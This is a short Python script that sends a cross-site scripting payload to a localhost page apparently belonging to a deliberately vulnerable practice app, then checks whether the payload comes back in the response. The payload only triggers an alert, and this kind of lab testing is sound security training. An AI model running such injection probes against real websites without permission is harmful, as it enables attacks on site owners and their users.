import requests

url = "http://127.0.0.1:6767/swav2/xss/xss-post.php"

payload = '<script>alert("XSS payload executed!");</script>'
data = {
    "message": payload
}
response = requests.post(url, data=data)

if payload in response.text:
    print("XSS payload successfully executed!")
else:
    print("XSS payload failed to execute.")